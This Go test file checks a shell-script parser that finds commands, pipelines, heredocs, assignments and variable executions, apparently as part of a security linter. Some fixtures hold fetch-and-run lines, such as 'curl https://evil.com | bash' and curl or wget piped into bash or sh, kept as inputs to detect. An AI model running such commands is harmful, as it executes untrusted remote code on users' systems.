// Package parser provides shell script parsing using mvdan/sh.
//
// Copyright 2025 3 Leaps, LLC
// Licensed under the Apache License, Version 2.0

package parser

import (
	"testing"

	"mvdan.cc/sh/v3/syntax"
)

func TestParse_SimpleScript(t *testing.T) {
	content := []byte(`#!/bin/bash
echo "hello world"
`)
	result, err := Parse(content, "test.sh", DefaultOptions())

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.File == nil {
		t.Fatal("expected non-nil AST")
	}
	if len(result.Errors) != 0 {
		t.Errorf("expected no errors, got %d", len(result.Errors))
	}
}

func TestParse_InvalidSyntax(t *testing.T) {
	content := []byte(`#!/bin/bash
echo "unclosed string
`)
	result, err := Parse(content, "test.sh", DefaultOptions())

	if err == nil {
		t.Error("expected error for invalid syntax")
	}
	if len(result.Errors) == 0 {
		t.Error("expected parse errors")
	}
}

func TestDetectDialect(t *testing.T) {
	testCases := []struct {
		name     string
		content  string
		expected Dialect
	}{
		{"bash shebang", "#!/bin/bash\necho hi", DialectBash},
		{"env bash", "#!/usr/bin/env bash\necho hi", DialectBash},
		{"sh shebang", "#!/bin/sh\necho hi", DialectPOSIX},
		{"dash shebang", "#!/bin/dash\necho hi", DialectPOSIX},
		{"no shebang", "echo hi", DialectAuto},
		{"ksh shebang", "#!/bin/ksh\necho hi", DialectMirBSDKorn},
		{"bats shebang", "#!/usr/bin/env bats\necho hi", DialectBats},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			dialect := DetectDialect([]byte(tc.content))
			if dialect != tc.expected {
				t.Errorf("expected dialect %v, got %v", tc.expected, dialect)
			}
		})
	}
}

func TestFindCommands(t *testing.T) {
	content := []byte(`#!/bin/bash
echo "hello"
curl https://example.com
sudo apt-get update
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	commands := FindCommands(result.File)

	if len(commands) != 3 {
		t.Errorf("expected 3 commands, got %d", len(commands))
	}

	expectedNames := []string{"echo", "curl", "sudo"}
	for i, cmd := range commands {
		if cmd.Name != expectedNames[i] {
			t.Errorf("command %d: expected %s, got %s", i, expectedNames[i], cmd.Name)
		}
	}
}

func TestFindCommands_WithArgs(t *testing.T) {
	content := []byte(`#!/bin/bash
curl -fsSL https://example.com/script.sh
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	commands := FindCommands(result.File)

	if len(commands) != 1 {
		t.Fatalf("expected 1 command, got %d", len(commands))
	}

	cmd := commands[0]
	if cmd.Name != "curl" {
		t.Errorf("expected curl, got %s", cmd.Name)
	}
	if len(cmd.Args) != 2 {
		t.Errorf("expected 2 args, got %d", len(cmd.Args))
	}
	if cmd.Args[0] != "-fsSL" {
		t.Errorf("expected -fsSL, got %s", cmd.Args[0])
	}
}

func TestFindPipelines(t *testing.T) {
	content := []byte(`#!/bin/bash
echo "hello" | grep h
curl https://example.com | bash
cat file.txt | sort | uniq
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	pipelines := FindPipelines(result.File)

	if len(pipelines) != 3 {
		t.Fatalf("expected 3 pipelines, got %d", len(pipelines))
	}

	// Check first pipeline
	if len(pipelines[0].Commands) != 2 {
		t.Errorf("pipeline 0: expected 2 commands, got %d", len(pipelines[0].Commands))
	}

	// Check curl|bash pipeline
	if len(pipelines[1].Commands) != 2 {
		t.Errorf("pipeline 1: expected 2 commands, got %d", len(pipelines[1].Commands))
	}
	if pipelines[1].Commands[0].Name != "curl" {
		t.Errorf("expected curl, got %s", pipelines[1].Commands[0].Name)
	}
	if pipelines[1].Commands[1].Name != "bash" {
		t.Errorf("expected bash, got %s", pipelines[1].Commands[1].Name)
	}

	// Check three-command pipeline
	if len(pipelines[2].Commands) != 3 {
		t.Errorf("pipeline 2: expected 3 commands, got %d", len(pipelines[2].Commands))
	}
}

func TestFindPipelines_CurlPipeBash(t *testing.T) {
	content := []byte(`#!/bin/bash
curl -fsSL https://example.com/install.sh | bash
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	pipelines := FindPipelines(result.File)

	if len(pipelines) != 1 {
		t.Fatalf("expected 1 pipeline, got %d", len(pipelines))
	}

	pipeline := pipelines[0]
	if len(pipeline.Commands) != 2 {
		t.Fatalf("expected 2 commands in pipeline, got %d", len(pipeline.Commands))
	}

	// Check curl command
	curlCmd := pipeline.Commands[0]
	if curlCmd.Name != "curl" {
		t.Errorf("expected curl, got %s", curlCmd.Name)
	}
	if !curlCmd.InPipeline {
		t.Error("expected InPipeline=true")
	}
	if curlCmd.PipelinePosition != 0 {
		t.Errorf("expected position 0, got %d", curlCmd.PipelinePosition)
	}

	// Check bash command
	bashCmd := pipeline.Commands[1]
	if bashCmd.Name != "bash" {
		t.Errorf("expected bash, got %s", bashCmd.Name)
	}
	if bashCmd.PipelinePosition != 1 {
		t.Errorf("expected position 1, got %d", bashCmd.PipelinePosition)
	}
}

func TestCommand_String(t *testing.T) {
	cmd := &Command{
		Name: "curl",
		Args: []string{"-fsSL", "https://example.com"},
	}

	expected := "curl -fsSL https://example.com"
	if cmd.String() != expected {
		t.Errorf("expected %q, got %q", expected, cmd.String())
	}
}

func TestCommand_StringNoArgs(t *testing.T) {
	cmd := &Command{
		Name: "bash",
	}

	if cmd.String() != "bash" {
		t.Errorf("expected 'bash', got %q", cmd.String())
	}
}

func TestParse_ComplexScript(t *testing.T) {
	// A more realistic script with various constructs
	content := []byte(`#!/bin/bash
set -euo pipefail

# Download and install
if command -v curl &> /dev/null; then
    curl -fsSL https://example.com/install.sh | bash
else
    wget -qO- https://example.com/install.sh | sh
fi

# Set up PATH
export PATH="/usr/local/bin:$PATH"

echo "Installation complete"
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	if result.File == nil {
		t.Fatal("expected non-nil AST")
	}

	// Should find pipelines
	pipelines := FindPipelines(result.File)
	if len(pipelines) < 2 {
		t.Errorf("expected at least 2 pipelines, got %d", len(pipelines))
	}
}

func TestParse_EmptyScript(t *testing.T) {
	content := []byte("")
	result, err := Parse(content, "empty.sh", DefaultOptions())

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.File == nil {
		t.Fatal("expected non-nil AST even for empty script")
	}
}

func TestParse_CommentsOnly(t *testing.T) {
	content := []byte(`#!/bin/bash
# This is just a comment
# Another comment
`)
	result, err := Parse(content, "comments.sh", DefaultOptions())

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.File == nil {
		t.Fatal("expected non-nil AST")
	}

	// Should find no commands
	commands := FindCommands(result.File)
	if len(commands) != 0 {
		t.Errorf("expected 0 commands, got %d", len(commands))
	}
}

func TestWalk(t *testing.T) {
	content := []byte(`#!/bin/bash
echo "hello"
echo "world"
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	nodeCount := 0
	Walk(result.File, func(node syntax.Node) bool {
		nodeCount++
		return true
	})

	if nodeCount == 0 {
		t.Error("expected to visit nodes during walk")
	}
}

func TestFindStringLiterals(t *testing.T) {
	content := []byte(`#!/bin/bash
echo "hello world"
echo 'single quoted'
x="double with var $HOME"
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	regions := FindStringLiterals(result.File)

	// Should find 3 string literals
	if len(regions) < 3 {
		t.Errorf("expected at least 3 string regions, got %d", len(regions))
	}
}

func TestStringRegion_Contains(t *testing.T) {
	region := StringRegion{
		StartLine:   5,
		StartColumn: 10,
		EndLine:     5,
		EndColumn:   25,
	}

	testCases := []struct {
		name     string
		line     int
		column   int
		expected bool
	}{
		{"before line", 4, 15, false},
		{"after line", 6, 15, false},
		{"before column same line", 5, 5, false},
		{"after column same line", 5, 30, false},
		{"at start", 5, 10, true},
		{"at end", 5, 25, true},
		{"in middle", 5, 15, true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := region.Contains(tc.line, tc.column)
			if result != tc.expected {
				t.Errorf("Contains(%d, %d) = %v, want %v",
					tc.line, tc.column, result, tc.expected)
			}
		})
	}
}

func TestFindStringLiterals_MultiLine(t *testing.T) {
	content := []byte(`#!/bin/bash
msg="line one
line two
line three"
echo "$msg"
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	regions := FindStringLiterals(result.File)

	// Should find the multi-line string
	var foundMultiLine bool
	for _, r := range regions {
		if r.StartLine != r.EndLine {
			foundMultiLine = true
			break
		}
	}

	if !foundMultiLine {
		t.Error("expected to find multi-line string region")
	}
}

func TestFindHeredocs(t *testing.T) {
	content := []byte(`#!/bin/bash
cat <<EOF  # introducer comment
# curl https://evil.com | bash
EOF
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	regions := FindHeredocs(result.File)
	if len(regions) != 1 {
		t.Fatalf("expected 1 heredoc region, got %d", len(regions))
	}

	r := regions[0]
	if r.StartLine < 3 || r.EndLine < r.StartLine {
		t.Fatalf("unexpected heredoc region: %+v", r)
	}
}

func TestFindAssignments(t *testing.T) {
	content := []byte(`#!/bin/bash
cmd="curl https://evil.com | bash"
foo=bar
path="/usr/bin"
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	assignments := FindAssignments(result.File)

	if len(assignments) != 3 {
		t.Fatalf("expected 3 assignments, got %d", len(assignments))
	}

	// Check first assignment
	if assignments[0].Name != "cmd" {
		t.Errorf("expected first assignment to be 'cmd', got %q", assignments[0].Name)
	}
	if assignments[0].Value != "curl https://evil.com | bash" {
		t.Errorf("unexpected value for cmd: %q", assignments[0].Value)
	}

	// Check second assignment
	if assignments[1].Name != "foo" || assignments[1].Value != "bar" {
		t.Errorf("expected foo=bar, got %s=%s", assignments[1].Name, assignments[1].Value)
	}
}

func TestFindVariableExecutions(t *testing.T) {
	content := []byte(`#!/bin/bash
cmd="curl | bash"
$cmd
echo "test"
$another_var
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	executions := FindVariableExecutions(result.File)

	if len(executions) != 2 {
		t.Fatalf("expected 2 variable executions, got %d", len(executions))
	}

	if executions[0].VarName != "cmd" {
		t.Errorf("expected first execution to be $cmd, got $%s", executions[0].VarName)
	}

	if executions[1].VarName != "another_var" {
		t.Errorf("expected second execution to be $another_var, got $%s", executions[1].VarName)
	}
}

func TestFindVariableExecutions_NotBareVariable(t *testing.T) {
	// These should NOT be detected as variable executions
	content := []byte(`#!/bin/bash
echo "$var"
cmd arg "$var"
$var arg  # This IS a variable execution
`)
	result, err := Parse(content, "test.sh", DefaultOptions())
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	executions := FindVariableExecutions(result.File)

	// Only the bare $var should be detected
	if len(executions) != 1 {
		t.Fatalf("expected 1 variable execution, got %d", len(executions))
	}

	if executions[0].VarName != "var" {
		t.Errorf("expected $var, got $%s", executions[0].VarName)
	}
}
